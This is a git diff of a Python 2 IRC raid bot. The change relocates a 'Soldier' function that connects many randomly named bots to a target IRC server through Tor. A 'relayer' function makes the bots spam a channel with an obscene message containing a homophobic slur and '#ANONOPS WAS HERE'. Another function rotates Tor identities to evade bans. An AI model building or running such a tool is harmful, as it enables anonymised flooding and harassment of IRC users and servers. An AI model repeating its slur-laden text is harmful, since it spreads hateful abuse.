@@ -104,23 +104,7 @@ def receiveCommandCenter(s,channel):
 	print "["+host+"]"
 	army(host, s)
 	print "[Main thread killed. Hooked to target]"
-				
-def Soldier(host, q):
-	nick = ''.join(random.choice(string.ascii_letters) for x in range(3)) + str(random.randint(0, 10000))
-	port = 6667
-	channel = "#cake"
-	#Connect to irc server
-	s = socks.socksocket()
-	s.setproxy(socks.PROXY_TYPE_SOCKS5, "127.0.0.1", 9050)
-	s.connect((host,6667))
-	s.send("NICK " + nick + "\r\n")
-	s.send("USER " + nick + " " + nick + " " + nick + " "+nick+"\r\n")
-	global bots
-	bots.append(s)
-	thread = threading.Thread(target=receive,args=[s, channel])
-	thread1 = threading.Thread(target=relayer,args=[q, s, channel])
-	thread.start()
-	thread1.start()
+	
 def relayer(command, target, channel):
 	while True:
 		msg = command.recv(1024)
@@ -152,6 +136,24 @@ def relayer(command, target, channel):
 						bot.send("PRIVMSG " + channel + " :FUCK YOU FAGGOT BITCHES #ANONOPS WAS HERE\r\n")
 						i+=1   
 				print "[Relayed anon command to target]"
+				
+def Soldier(host, q):
+	nick = ''.join(random.choice(string.ascii_letters) for x in range(3)) + str(random.randint(0, 10000))
+	port = 6667
+	channel = "#cake"
+	#Connect to irc server
+	s = socks.socksocket()
+	s.setproxy(socks.PROXY_TYPE_SOCKS5, "127.0.0.1", 9050)
+	s.connect((host,6667))
+	s.send("NICK " + nick + "\r\n")
+	s.send("USER " + nick + " " + nick + " " + nick + " "+nick+"\r\n")
+	global bots
+	bots.append(s)
+	thread = threading.Thread(target=receive,args=[s, channel])
+	thread1 = threading.Thread(target=relayer,args=[q, s, channel])
+	thread.start()
+	thread1.start()
+	
 def NewTorIP():
 	with Controller.from_port(port = 9051) as controller:
 		controller.authenticate()
